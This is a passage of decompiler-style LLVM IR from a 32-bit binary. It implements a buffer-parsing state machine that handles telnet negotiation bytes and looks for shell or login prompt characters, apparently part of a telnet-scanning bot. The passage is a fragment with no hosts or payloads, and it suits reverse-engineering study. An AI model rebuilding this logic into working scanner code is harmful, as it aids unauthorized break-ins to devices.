dec_label_pc_804e42c:                             ; preds = %dec_label_pc_804e425.preheader, %dec_label_pc_804e425.backedge.dec_label_pc_804e42c_crit_edge
  %v1_804e42f = phi i32 [ %v1_804e42f.pre, %dec_label_pc_804e425.backedge.dec_label_pc_804e42c_crit_edge ], [ %v0_804e416, %dec_label_pc_804e425.preheader ]
  %v0_804e42c = phi i32 [ %v0_804e425, %dec_label_pc_804e425.backedge.dec_label_pc_804e42c_crit_edge ], [ %v0_804e42526, %dec_label_pc_804e425.preheader ]
  %v1_804e42c = add i32 %v0_804e42c, 28
  store i32 %v1_804e42c, i32* %eax.global-to-local, align 4
  %v2_804e42f = add i32 %v1_804e42f, 8
  %v3_804e42f = inttoptr i32 %v2_804e42f to i32*
  store i32 %v1_804e42c, i32* %v3_804e42f, align 4
  %v0_804e433 = load i32, i32* @edi, align 4
  %v1_804e433 = add i32 %v0_804e433, 24
  %v2_804e433 = inttoptr i32 %v1_804e433 to i32*
  %v3_804e433 = load i32, i32* %v2_804e433, align 4
  %v9_804e433 = icmp eq i32 %v3_804e433, 256
  br i1 %v9_804e433, label %dec_label_pc_804e9c9, label %dec_label_pc_804e440

dec_label_pc_804e440:                             ; preds = %dec_label_pc_804e42c, %dec_label_pc_804e9c9
  %v0_804e440 = load i32, i32* @esp, align 4
  %v1_804e440 = add i32 %v0_804e440, 24
  %v2_804e440 = inttoptr i32 %v1_804e440 to i32*
  %v3_804e440 = load i32, i32* %v2_804e440, align 4
  store i32 %v3_804e440, i32* %ecx.global-to-local, align 4
  %v1_804e444 = add i32 %v0_804e440, 8
  %v2_804e444 = inttoptr i32 %v1_804e444 to i32*
  %v3_804e444 = load i32, i32* %v2_804e444, align 4
  store i32 %v3_804e444, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804e44d = inttoptr i32 %v3_804e440 to i32*
  store i32 0, i32* %v1_804e44d, align 4
  %v0_804e453 = load i32, i32* @edi, align 4
  %v1_804e453 = add i32 %v0_804e453, 24
  %v2_804e453 = inttoptr i32 %v1_804e453 to i32*
  %v3_804e453 = load i32, i32* %v2_804e453, align 4
  store i32 %v3_804e453, i32* %edx.global-to-local, align 4
  %v0_804e456 = load i32, i32* @esp, align 4
  %v1_804e456 = add i32 %v0_804e456, -4
  %v2_804e456 = inttoptr i32 %v1_804e456 to i32*
  store i32 16384, i32* %v2_804e456, align 4
  %v0_804e45b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e45b = load i32, i32* %edx.global-to-local, align 4
  %v2_804e45b = add i32 %v1_804e45b, %v0_804e45b
  store i32 %v2_804e45b, i32* @ebx, align 4
  %v0_804e45d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e45d = sub i32 %v0_804e45d, %v1_804e45b
  store i32 %v2_804e45d, i32* %eax.global-to-local, align 4
  %v2_804e45f = add i32 %v0_804e456, -8
  %v3_804e45f = inttoptr i32 %v2_804e45f to i32*
  store i32 %v2_804e45d, i32* %v3_804e45f, align 4
  %v0_804e460 = load i32, i32* @ebx, align 4
  %v2_804e460 = add i32 %v0_804e456, -12
  %v3_804e460 = inttoptr i32 %v2_804e460 to i32*
  store i32 %v0_804e460, i32* %v3_804e460, align 4
  %v0_804e461 = load i32, i32* @edi, align 4
  %v1_804e461 = add i32 %v0_804e461, 4
  %v2_804e461 = inttoptr i32 %v1_804e461 to i32*
  %v3_804e461 = load i32, i32* %v2_804e461, align 4
  store i32 %v3_804e461, i32* @esi, align 4
  %v2_804e464 = add i32 %v0_804e456, -16
  %v3_804e464 = inttoptr i32 %v2_804e464 to i32*
  store i32 %v3_804e461, i32* %v3_804e464, align 4
  %v0_804e465 = call i32 @function_80503cb()
  store i32 %v0_804e465, i32* %eax.global-to-local, align 4
  %v0_804e46a = load i32, i32* @esp, align 4
  %v1_804e46a = add i32 %v0_804e46a, 16
  %tmp129 = icmp slt i32 %v0_804e465, 1
  br i1 %tmp129, label %dec_label_pc_804e8c3, label %dec_label_pc_804e476

dec_label_pc_804e476:                             ; preds = %dec_label_pc_804e440
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e478

dec_label_pc_804e478:                             ; preds = %dec_label_pc_804e482, %dec_label_pc_804e476
  %v0_804e47e = phi i32 [ %v1_804e482, %dec_label_pc_804e482 ], [ 0, %dec_label_pc_804e476 ]
  %v1_804e478 = load i32, i32* @ebx, align 4
  %v2_804e478 = add i32 %v1_804e478, %v0_804e47e
  %v3_804e478 = inttoptr i32 %v2_804e478 to i8*
  %v4_804e478 = load i8, i8* %v3_804e478, align 1
  %v5_804e478 = icmp eq i8 %v4_804e478, 0
  %v1_804e47c = icmp eq i1 %v5_804e478, false
  br i1 %v1_804e47c, label %dec_label_pc_804e482, label %dec_label_pc_804e47e

dec_label_pc_804e47e:                             ; preds = %dec_label_pc_804e478
  store i8 65, i8* %v3_804e478, align 1
  %v0_804e482.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e482

dec_label_pc_804e482:                             ; preds = %dec_label_pc_804e478, %dec_label_pc_804e47e
  %v0_804e482 = phi i32 [ %v0_804e47e, %dec_label_pc_804e478 ], [ %v0_804e482.pre, %dec_label_pc_804e47e ]
  %v1_804e482 = add i32 %v0_804e482, 1
  store i32 %v1_804e482, i32* %edx.global-to-local, align 4
  %v12_804e483 = icmp eq i32 %v0_804e465, %v1_804e482
  %v1_804e485 = icmp eq i1 %v12_804e483, false
  br i1 %v1_804e485, label %dec_label_pc_804e478, label %dec_label_pc_804e487

dec_label_pc_804e487:                             ; preds = %dec_label_pc_804e482, %dec_label_pc_804e8c9
  %v0_804e487 = load i32, i32* @edi, align 4
  %v1_804e487 = add i32 %v0_804e487, 24
  %v2_804e487 = inttoptr i32 %v1_804e487 to i32*
  %v3_804e487 = load i32, i32* %v2_804e487, align 4
  %v2_804e48a = add i32 %v3_804e487, %v0_804e465
  store i32 %v2_804e48a, i32* %edx.global-to-local, align 4
  %v0_804e48c = load i32, i32* @global_var_8053130.9, align 16
  store i32 %v0_804e48c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e48a, i32* %v2_804e487, align 4
  %v0_804e494 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e494 = load i32, i32* @edi, align 4
  %v2_804e494 = add i32 %v1_804e494, 8
  %v3_804e494 = inttoptr i32 %v2_804e494 to i32*
  store i32 %v0_804e494, i32* %v3_804e494, align 4
  br label %dec_label_pc_804e497

dec_label_pc_804e497:                             ; preds = %dec_label_pc_804e793, %dec_label_pc_804e487
  %v0_804e497 = load i32, i32* @edi, align 4
  %v1_804e497 = add i32 %v0_804e497, 12
  %v2_804e497 = inttoptr i32 %v1_804e497 to i32*
  %v3_804e497 = load i32, i32* %v2_804e497, align 4
  store i32 %v3_804e497, i32* %eax.global-to-local, align 4
  switch i32 %v3_804e497, label %dec_label_pc_804e425.backedge [
    i32 2, label %dec_label_pc_804e4a7
    i32 3, label %dec_label_pc_804e53a
    i32 4, label %dec_label_pc_804e580
    i32 5, label %dec_label_pc_804e5c0
    i32 6, label %dec_label_pc_804e650
    i32 7, label %dec_label_pc_804e7b3
    i32 8, label %dec_label_pc_804e605
    i32 9, label %dec_label_pc_804e7f8
    i32 10, label %dec_label_pc_804e707
  ]

dec_label_pc_804e4a7:                             ; preds = %dec_label_pc_804e497
  %v0_804e4a7 = load i32, i32* @esp, align 4
  %v1_804e4a7 = add i32 %v0_804e4a7, 8
  %v2_804e4a7 = inttoptr i32 %v1_804e4a7 to i32*
  %v3_804e4a7 = load i32, i32* %v2_804e4a7, align 4
  store i32 %v3_804e4a7, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v1_804e4ad = add i32 %v0_804e497, 24
  %v2_804e4ad = inttoptr i32 %v1_804e4ad to i32*
  %v3_804e4ad = load i32, i32* %v2_804e4ad, align 4
  store i32 %v3_804e4ad, i32* %edx.global-to-local, align 4
  %v2_804e4b017 = sub i32 0, %v3_804e4ad
  %v10_804e4b021 = and i32 %v3_804e4ad, %v2_804e4b017
  %v11_804e4b022 = icmp slt i32 %v10_804e4b021, 0
  %v13_804e4b024 = icmp slt i32 %v2_804e4b017, 0
  %v2_804e4b225 = icmp eq i1 %v13_804e4b024, %v11_804e4b022
  br i1 %v2_804e4b225, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e4b4.preheader

dec_label_pc_804e4b4.preheader:                   ; preds = %dec_label_pc_804e4a7, %dec_label_pc_804e4b0.backedge
  %v0_804e52e118 = phi i32 [ %v0_804e52e120, %dec_label_pc_804e4b0.backedge ], [ %v0_804e497, %dec_label_pc_804e4a7 ]
  %v0_804e8b2111 = phi i32 [ %v0_804e4b0, %dec_label_pc_804e4b0.backedge ], [ 0, %dec_label_pc_804e4a7 ]
  %v5_804e4c6108 = phi i32 [ %v5_804e4c6109, %dec_label_pc_804e4b0.backedge ], [ 2, %dec_label_pc_804e4a7 ]
  %v1_804e4c0106 = phi i32 [ %v1_804e4b0, %dec_label_pc_804e4b0.backedge ], [ %v3_804e4ad, %dec_label_pc_804e4a7 ]
  %v0_804e4b9103 = phi i32 [ %v0_804e4b9104, %dec_label_pc_804e4b0.backedge ], [ %v0_804e4a7, %dec_label_pc_804e4a7 ]
  br label %dec_label_pc_804e4b4

dec_label_pc_804e4b4:                             ; preds = %dec_label_pc_804e4b4.preheader, %dec_label_pc_804e505
  %v0_804e52e121 = phi i32 [ %v0_804e52e118, %dec_label_pc_804e4b4.preheader ], [ %v0_804e51c, %dec_label_pc_804e505 ]
  %v0_804e8b2 = phi i32 [ %v0_804e8b2111, %dec_label_pc_804e4b4.preheader ], [ %v0_804e522, %dec_label_pc_804e505 ]
  %v5_804e4c6 = phi i32 [ %v5_804e4c6108, %dec_label_pc_804e4b4.preheader ], [ %v0_804e517, %dec_label_pc_804e505 ]
  %v1_804e4c0 = phi i32 [ %v1_804e4c0106, %dec_label_pc_804e4b4.preheader ], [ %v3_804e51c, %dec_label_pc_804e505 ]
  %v0_804e928 = phi i32 [ %v0_804e4b9103, %dec_label_pc_804e4b4.preheader ], [ %v1_804e51f, %dec_label_pc_804e505 ]
  %v0_804e4b4 = load i32, i32* @ebx, align 4
  %v1_804e4b4 = inttoptr i32 %v0_804e4b4 to i8*
  %v2_804e4b4 = load i8, i8* %v1_804e4b4, align 1
  %v12_804e4b4 = icmp eq i8 %v2_804e4b4, -1
  %v1_804e4b7 = icmp eq i1 %v12_804e4b4, false
  br i1 %v1_804e4b7, label %dec_label_pc_804e526, label %dec_label_pc_804e4b9

dec_label_pc_804e4b9:                             ; preds = %dec_label_pc_804e4b4
  %v1_804e4b9 = add i32 %v0_804e928, 8
  %v2_804e4b9 = inttoptr i32 %v1_804e4b9 to i32*
  %v3_804e4b9 = load i32, i32* %v2_804e4b9, align 4
  %v1_804e4bd = add i32 %v0_804e4b4, 1
  store i32 %v1_804e4bd, i32* %ecx.global-to-local, align 4
  %v2_804e4c0 = add i32 %v3_804e4b9, %v1_804e4c0
  %tmp305 = icmp ugt i32 %v2_804e4c0, %v1_804e4bd
  br i1 %tmp305, label %dec_label_pc_804e4c6, label %dec_label_pc_804e526

dec_label_pc_804e4c6:                             ; preds = %dec_label_pc_804e4b9
  %v2_804e4c6 = inttoptr i32 %v1_804e4bd to i8*
  %v3_804e4c6 = load i8, i8* %v2_804e4c6, align 1
  %v4_804e4c6 = zext i8 %v3_804e4c6 to i32
  %v6_804e4c6 = and i32 %v5_804e4c6, -256
  %v7_804e4c6 = or i32 %v4_804e4c6, %v6_804e4c6
  store i32 %v7_804e4c6, i32* %eax.global-to-local, align 4
  switch i8 %v3_804e4c6, label %dec_label_pc_804e4d9 [
    i8 -1, label %dec_label_pc_804e8af
    i8 -3, label %dec_label_pc_804e928
  ]

dec_label_pc_804e4d9:                             ; preds = %dec_label_pc_804e4c6
  %v1_804e4d9 = add i32 %v0_804e4b4, 2
  store i32 %v1_804e4d9, i32* %eax.global-to-local, align 4
  %tmp306 = icmp ugt i32 %v2_804e4c0, %v1_804e4d9
  br i1 %tmp306, label %dec_label_pc_804e4e0, label %dec_label_pc_804e526

dec_label_pc_804e4e0:                             ; preds = %dec_label_pc_804e4d9, %dec_label_pc_804ef9a, %dec_label_pc_804efa2, %dec_label_pc_804e9b0
  %v0_804e4e0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e4e0 = inttoptr i32 %v0_804e4e0 to i8*
  %v2_804e4e0 = load i8, i8* %v1_804e4e0, align 1
  %v3_804e4e0 = zext i8 %v2_804e4e0 to i32
  %v4_804e4e0 = load i32, i32* %eax.global-to-local, align 4
  %v5_804e4e0 = and i32 %v4_804e4e0, -256
  %v6_804e4e0 = or i32 %v5_804e4e0, %v3_804e4e0
  store i32 %v6_804e4e0, i32* %eax.global-to-local, align 4
  switch i8 %v2_804e4e0, label %dec_label_pc_804e4f2 [
    i8 -3, label %dec_label_pc_804e920
    i8 -5, label %dec_label_pc_804e9c1
  ]

dec_label_pc_804e4f2:                             ; preds = %dec_label_pc_804e4e0, %dec_label_pc_804e9c1, %dec_label_pc_804e920
  %v0_804e4f2 = load i32, i32* @ebx, align 4
  %v1_804e4f2 = add i32 %v0_804e4f2, 2
  %v2_804e4f2 = inttoptr i32 %v1_804e4f2 to i8*
  %v3_804e4f2 = load i8, i8* %v2_804e4f2, align 1
  %v4_804e4f2 = zext i8 %v3_804e4f2 to i32
  %v5_804e4f2 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e4f2 = and i32 %v5_804e4f2, -256
  %v7_804e4f2 = or i32 %v6_804e4f2, %v4_804e4f2
  store i32 %v7_804e4f2, i32* %eax.global-to-local, align 4
  switch i8 %v3_804e4f2, label %dec_label_pc_804e505 [
    i8 -3, label %dec_label_pc_804e8ba
    i8 -5, label %dec_label_pc_804e9b8
  ]

dec_label_pc_804e505:                             ; preds = %dec_label_pc_804e4f2, %dec_label_pc_804e9b8, %dec_label_pc_804e8ba
  %v0_804e505 = load i32, i32* @esp, align 4
  %v1_804e505 = add i32 %v0_804e505, -4
  %v2_804e505 = inttoptr i32 %v1_804e505 to i32*
  store i32 16384, i32* %v2_804e505, align 4
  %v1_804e50a = add i32 %v0_804e505, -8
  %v2_804e50a = inttoptr i32 %v1_804e50a to i32*
  store i32 3, i32* %v2_804e50a, align 4
  %v0_804e50c = load i32, i32* @ebx, align 4
  %v2_804e50c = add i32 %v0_804e505, -12
  %v3_804e50c = inttoptr i32 %v2_804e50c to i32*
  store i32 %v0_804e50c, i32* %v3_804e50c, align 4
  %v0_804e50d = load i32, i32* @esi, align 4
  %v1_804e50d = add i32 %v0_804e50d, 3
  store i32 %v1_804e50d, i32* @esi, align 4
  %v0_804e510 = load i32, i32* @edi, align 4
  %v1_804e510 = add i32 %v0_804e510, 4
  %v2_804e510 = inttoptr i32 %v1_804e510 to i32*
  %v3_804e510 = load i32, i32* %v2_804e510, align 4
  %v0_804e513 = load i32, i32* @ebx, align 4
  %v1_804e513 = add i32 %v0_804e513, 3
  store i32 %v1_804e513, i32* @ebx, align 4
  %v2_804e516 = add i32 %v0_804e505, -16
  %v3_804e516 = inttoptr i32 %v2_804e516 to i32*
  store i32 %v3_804e510, i32* %v3_804e516, align 4
  %v0_804e517 = call i32 @function_8050441()
  store i32 %v0_804e517, i32* %eax.global-to-local, align 4
  %v0_804e51c = load i32, i32* @edi, align 4
  %v1_804e51c = add i32 %v0_804e51c, 24
  %v2_804e51c = inttoptr i32 %v1_804e51c to i32*
  %v3_804e51c = load i32, i32* %v2_804e51c, align 4
  store i32 %v3_804e51c, i32* %edx.global-to-local, align 4
  %v0_804e51f = load i32, i32* @esp, align 4
  %v1_804e51f = add i32 %v0_804e51f, 16
  %v0_804e522 = load i32, i32* @esi, align 4
  %v2_804e522 = sub i32 %v0_804e522, %v3_804e51c
  %v8_804e522 = xor i32 %v0_804e522, %v3_804e51c
  %v9_804e522 = xor i32 %v2_804e522, %v0_804e522
  %v10_804e522 = and i32 %v9_804e522, %v8_804e522
  %v11_804e522 = icmp slt i32 %v10_804e522, 0
  %v13_804e522 = icmp slt i32 %v2_804e522, 0
  %v2_804e524 = icmp eq i1 %v13_804e522, %v11_804e522
  br i1 %v2_804e524, label %dec_label_pc_804e526, label %dec_label_pc_804e4b4

dec_label_pc_804e526:                             ; preds = %dec_label_pc_804e4b0.backedge, %dec_label_pc_804e4d9, %dec_label_pc_804e4b9, %dec_label_pc_804e505, %dec_label_pc_804e4b4, %dec_label_pc_804e928.dec_label_pc_804e526.loopexit_crit_edge
  %v0_804e52e = phi i32 [ %v0_804e98c, %dec_label_pc_804e928.dec_label_pc_804e526.loopexit_crit_edge ], [ %v0_804e51c, %dec_label_pc_804e505 ], [ %v0_804e52e121, %dec_label_pc_804e4d9 ], [ %v0_804e52e121, %dec_label_pc_804e4b9 ], [ %v0_804e52e121, %dec_label_pc_804e4b4 ], [ %v0_804e52e120, %dec_label_pc_804e4b0.backedge ]
  %v0_804e526 = phi i32 [ %v0_804e526.pre.pre, %dec_label_pc_804e928.dec_label_pc_804e526.loopexit_crit_edge ], [ %v0_804e522, %dec_label_pc_804e505 ], [ %v0_804e8b2, %dec_label_pc_804e4d9 ], [ %v0_804e8b2, %dec_label_pc_804e4b9 ], [ %v0_804e8b2, %dec_label_pc_804e4b4 ], [ %v0_804e4b0, %dec_label_pc_804e4b0.backedge ]
  %tmp130 = icmp slt i32 %v0_804e526, 1
  br i1 %tmp130, label %dec_label_pc_804ea99, label %dec_label_pc_804e52e

dec_label_pc_804e52e:                             ; preds = %dec_label_pc_804e526
  %v1_804e52e = add i32 %v0_804e52e, 12
  %v2_804e52e = inttoptr i32 %v1_804e52e to i32*
  store i32 3, i32* %v2_804e52e, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804e53a:                             ; preds = %dec_label_pc_804e497
  %v1_804e53a = add i32 %v0_804e497, 24
  %v2_804e53a = inttoptr i32 %v1_804e53a to i32*
  %v3_804e53a = load i32, i32* %v2_804e53a, align 4
  %v1_804e53d = add i32 %v3_804e53a, -1
  store i32 %v1_804e53d, i32* %eax.global-to-local, align 4
  %tmp131 = icmp slt i32 %v1_804e53d, 1
  br i1 %tmp131, label %dec_label_pc_804eb27, label %dec_label_pc_804e546.preheader

dec_label_pc_804e546.preheader:                   ; preds = %dec_label_pc_804e53a
  %v7_804e546.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e546 = add i32 %v0_804e497, 28
  br label %dec_label_pc_804e546

dec_label_pc_804e546:                             ; preds = %dec_label_pc_804e546.preheader, %dec_label_pc_804e577
  %v7_804e546 = phi i32 [ %v7_804e546.pre, %dec_label_pc_804e546.preheader ], [ %v9_804e546, %dec_label_pc_804e577 ]
  %v0_804eb1b = phi i32 [ %v1_804e53d, %dec_label_pc_804e546.preheader ], [ %v1_804e577, %dec_label_pc_804e577 ]
  %v3_804e546 = add i32 %v2_804e546, %v0_804eb1b
  %v4_804e546 = inttoptr i32 %v3_804e546 to i8*
  %v5_804e546 = load i8, i8* %v4_804e546, align 1
  %v6_804e546 = zext i8 %v5_804e546 to i32
  %v8_804e546 = and i32 %v7_804e546, -256
  %v9_804e546 = or i32 %v6_804e546, %v8_804e546
  store i32 %v9_804e546, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e546, label %dec_label_pc_804e577 [
    i8 58, label %dec_label_pc_804eb1b
    i8 62, label %dec_label_pc_804eb1b
    i8 36, label %dec_label_pc_804eb1b
    i8 35, label %dec_label_pc_804eb1b
    i8 37, label %dec_label_pc_804eb1b
  ]

dec_label_pc_804e577:                             ; preds = %dec_label_pc_804e546
  %v1_804e577 = add i32 %v0_804eb1b, -1
  %v8_804e577 = icmp eq i32 %v1_804e577, 0
  store i32 %v1_804e577, i32* %eax.global-to-local, align 4
  %v1_804e578 = icmp eq i1 %v8_804e577, false
  br i1 %v1_804e578, label %dec_label_pc_804e546, label %dec_label_pc_804eb27

dec_label_pc_804e580:                             ; preds = %dec_label_pc_804e497
  %v1_804e580 = add i32 %v0_804e497, 24
  %v2_804e580 = inttoptr i32 %v1_804e580 to i32*
  %v3_804e580 = load i32, i32* %v2_804e580, align 4
  %v1_804e583 = add i32 %v3_804e580, -1
  store i32 %v1_804e583, i32* %eax.global-to-local, align 4
  %tmp132 = icmp slt i32 %v1_804e583, 1
  br i1 %tmp132, label %dec_label_pc_804e9f8, label %dec_label_pc_804e58c.preheader

dec_label_pc_804e58c.preheader:                   ; preds = %dec_label_pc_804e580
  %v7_804e58c.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e58c = add i32 %v0_804e497, 28
  br label %dec_label_pc_804e58c

dec_label_pc_804e58c:                             ; preds = %dec_label_pc_804e58c.preheader, %dec_label_pc_804e5b4
  %v7_804e58c = phi i32 [ %v7_804e58c.pre, %dec_label_pc_804e58c.preheader ], [ %v9_804e58c, %dec_label_pc_804e5b4 ]
  %v0_804e9ec = phi i32 [ %v1_804e583, %dec_label_pc_804e58c.preheader ], [ %v1_804e5b4, %dec_label_pc_804e5b4 ]
  %v3_804e58c = add i32 %v2_804e58c, %v0_804e9ec
  %v4_804e58c = inttoptr i32 %v3_804e58c to i8*
  %v5_804e58c = load i8, i8* %v4_804e58c, align 1
  %v6_804e58c = zext i8 %v5_804e58c to i32
  %v8_804e58c = and i32 %v7_804e58c, -256
  %v9_804e58c = or i32 %v6_804e58c, %v8_804e58c
  store i32 %v9_804e58c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e58c, label %dec_label_pc_804e5b4 [
    i8 58, label %dec_label_pc_804e9ec
    i8 62, label %dec_label_pc_804e9ec
    i8 36, label %dec_label_pc_804e9ec
    i8 35, label %dec_label_pc_804e9ec
  ]

dec_label_pc_804e5b4:                             ; preds = %dec_label_pc_804e58c
  %v1_804e5b4 = add i32 %v0_804e9ec, -1
  %v8_804e5b4 = icmp eq i32 %v1_804e5b4, 0
  store i32 %v1_804e5b4, i32* %eax.global-to-local, align 4
  %v1_804e5b5 = icmp eq i1 %v8_804e5b4, false
  br i1 %v1_804e5b5, label %dec_label_pc_804e58c, label %dec_label_pc_804e9f8

dec_label_pc_804e5c0:                             ; preds = %dec_label_pc_804e497
  %v1_804e5c0 = add i32 %v0_804e497, 24
  %v2_804e5c0 = inttoptr i32 %v1_804e5c0 to i32*
  %v3_804e5c0 = load i32, i32* %v2_804e5c0, align 4
  %v1_804e5c3 = add i32 %v3_804e5c0, -1
  store i32 %v1_804e5c3, i32* %eax.global-to-local, align 4
  %tmp133 = icmp slt i32 %v1_804e5c3, 1
  br i1 %tmp133, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e5cc.preheader

dec_label_pc_804e5cc.preheader:                   ; preds = %dec_label_pc_804e5c0
  %v7_804e5cc.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e5cc = add i32 %v0_804e497, 28
  br label %dec_label_pc_804e5cc

dec_label_pc_804e5cc:                             ; preds = %dec_label_pc_804e5cc.preheader, %dec_label_pc_804e5fd
  %v7_804e5cc = phi i32 [ %v7_804e5cc.pre, %dec_label_pc_804e5cc.preheader ], [ %v9_804e5cc, %dec_label_pc_804e5fd ]
  %v0_804ecf4 = phi i32 [ %v1_804e5c3, %dec_label_pc_804e5cc.preheader ], [ %v1_804e5fd, %dec_label_pc_804e5fd ]
  %v3_804e5cc = add i32 %v2_804e5cc, %v0_804ecf4
  %v4_804e5cc = inttoptr i32 %v3_804e5cc to i8*
  %v5_804e5cc = load i8, i8* %v4_804e5cc, align 1
  %v6_804e5cc = zext i8 %v5_804e5cc to i32
  %v8_804e5cc = and i32 %v7_804e5cc, -256
  %v9_804e5cc = or i32 %v6_804e5cc, %v8_804e5cc
  store i32 %v9_804e5cc, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e5cc, label %dec_label_pc_804e5fd [
    i8 58, label %dec_label_pc_804ecf4
    i8 62, label %dec_label_pc_804ecf4
    i8 36, label %dec_label_pc_804ecf4
    i8 35, label %dec_label_pc_804ecf4
    i8 37, label %dec_label_pc_804ecf4
  ]

dec_label_pc_804e5fd:                             ; preds = %dec_label_pc_804e5cc
  %v1_804e5fd = add i32 %v0_804ecf4, -1
  %v8_804e5fd = icmp eq i32 %v1_804e5fd, 0
  store i32 %v1_804e5fd, i32* %eax.global-to-local, align 4
  %v1_804e5fe = icmp eq i1 %v8_804e5fd, false
  br i1 %v1_804e5fe, label %dec_label_pc_804e5cc, label %dec_label_pc_804e425.backedge

dec_label_pc_804e605:                             ; preds = %dec_label_pc_804e497
  %v1_804e605 = add i32 %v0_804e497, 24
  %v2_804e605 = inttoptr i32 %v1_804e605 to i32*
  %v3_804e605 = load i32, i32* %v2_804e605, align 4
  %v1_804e608 = add i32 %v3_804e605, -1
  store i32 %v1_804e608, i32* %eax.global-to-local, align 4
  %tmp134 = icmp slt i32 %v1_804e608, 1
  br i1 %tmp134, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e611.preheader

dec_label_pc_804e611.preheader:                   ; preds = %dec_label_pc_804e605
  %v7_804e611.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e611 = add i32 %v0_804e497, 28
  br label %dec_label_pc_804e611

dec_label_pc_804e611:                             ; preds = %dec_label_pc_804e611.preheader, %dec_label_pc_804e642
  %v7_804e611 = phi i32 [ %v7_804e611.pre, %dec_label_pc_804e611.preheader ], [ %v9_804e611, %dec_label_pc_804e642 ]
  %v0_804eaa6 = phi i32 [ %v1_804e608, %dec_label_pc_804e611.preheader ], [ %v1_804e642, %dec_label_pc_804e642 ]
  %v3_804e611 = add i32 %v2_804e611, %v0_804eaa6
  %v4_804e611 = inttoptr i32 %v3_804e611 to i8*
  %v5_804e611 = load i8, i8* %v4_804e611, align 1
  %v6_804e611 = zext i8 %v5_804e611 to i32
  %v8_804e611 = and i32 %v7_804e611, -256
  %v9_804e611 = or i32 %v6_804e611, %v8_804e611
  store i32 %v9_804e611, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e611, label %dec_label_pc_804e642 [
    i8 58, label %dec_label_pc_804eaa6
    i8 62, label %dec_label_pc_804eaa6
    i8 36, label %dec_label_pc_804eaa6
    i8 35, label %dec_label_pc_804eaa6
    i8 37, label %dec_label_pc_804eaa6
  ]

dec_label_pc_804e642:                             ; preds = %dec_label_pc_804e611
  %v1_804e642 = add i32 %v0_804eaa6, -1
  %v8_804e642 = icmp eq i32 %v1_804e642, 0
  store i32 %v1_804e642, i32* %eax.global-to-local, align 4
  %v1_804e643 = icmp eq i1 %v8_804e642, false
  br i1 %v1_804e643, label %dec_label_pc_804e611, label %dec_label_pc_804e425.backedge

dec_label_pc_804e650:                             ; preds = %dec_label_pc_804e497
  %v1_804e650 = add i32 %v0_804e497, 24
  %v2_804e650 = inttoptr i32 %v1_804e650 to i32*
  %v3_804e650 = load i32, i32* %v2_804e650, align 4
  %v1_804e653 = add i32 %v3_804e650, -1
  store i32 %v1_804e653, i32* %eax.global-to-local, align 4
  %tmp135 = icmp slt i32 %v1_804e653, 1
  br i1 %tmp135, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e65c

dec_label_pc_804e65c:                             ; preds = %dec_label_pc_804e650
  %v2_804e65c = add i32 %v0_804e497, 27
  %v3_804e65c = add i32 %v2_804e65c, %v3_804e650
  %v4_804e65c = inttoptr i32 %v3_804e65c to i8*
  %v5_804e65c = load i8, i8* %v4_804e65c, align 1
  %v6_804e65c = zext i8 %v5_804e65c to i32
  %v7_804e65c = load i32, i32* %edx.global-to-local, align 4
  %v8_804e65c = and i32 %v7_804e65c, -256
  %v9_804e65c = or i32 %v8_804e65c, %v6_804e65c
  store i32 %v9_804e65c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e65c, label %dec_label_pc_804e66a [
    i8 62, label %dec_label_pc_804e68e.thread
    i8 58, label %dec_label_pc_804e68e.thread
  ]

dec_label_pc_804e66a:                             ; preds = %dec_label_pc_804e65c, %dec_label_pc_804e680
  %v0_804e679 = phi i32 [ %v1_804e679, %dec_label_pc_804e680 ], [ %v1_804e653, %dec_label_pc_804e65c ]
  %v7_804e680 = phi i32 [ %v9_804e680, %dec_label_pc_804e680 ], [ %v9_804e65c, %dec_label_pc_804e65c ]
  %v1_804e66a = trunc i32 %v7_804e680 to i8
  %v1_804e66a.off = add i8 %v1_804e66a, -35
  %switch167 = icmp ult i8 %v1_804e66a.off, 3
  br i1 %switch167, label %dec_label_pc_804e68e, label %dec_label_pc_804e679

dec_label_pc_804e679:                             ; preds = %dec_label_pc_804e66a
  %v1_804e679 = add i32 %v0_804e679, -1
  %v8_804e679 = icmp eq i32 %v1_804e679, 0
  store i32 %v1_804e679, i32* %eax.global-to-local, align 4
  br i1 %v8_804e679, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804e680

dec_label_pc_804e680:                             ; preds = %dec_label_pc_804e679
  %v3_804e680 = add i32 %v2_804e65c, %v0_804e679
  %v4_804e680 = inttoptr i32 %v3_804e680 to i8*
  %v5_804e680 = load i8, i8* %v4_804e680, align 1
  %v6_804e680 = zext i8 %v5_804e680 to i32
  %v8_804e680 = and i32 %v7_804e680, -256
  %v9_804e680 = or i32 %v6_804e680, %v8_804e680
  store i32 %v9_804e680, i32* %edx.global-to-local, align 4
  %v10_804e684 = icmp ne i8 %v5_804e680, 58
  %v10_804e689 = icmp eq i8 %v5_804e680, 62
  %v1_804e68c = icmp eq i1 %v10_804e689, false
  %or.cond165 = and i1 %v10_804e684, %v1_804e68c
  br i1 %or.cond165, label %dec_label_pc_804e66a, label %dec_label_pc_804e68e

dec_label_pc_804e68e.thread:                      ; preds = %dec_label_pc_804e65c, %dec_label_pc_804e65c
  store i32 %v3_804e650, i32* @esi, align 4
  br label %dec_label_pc_804e69a

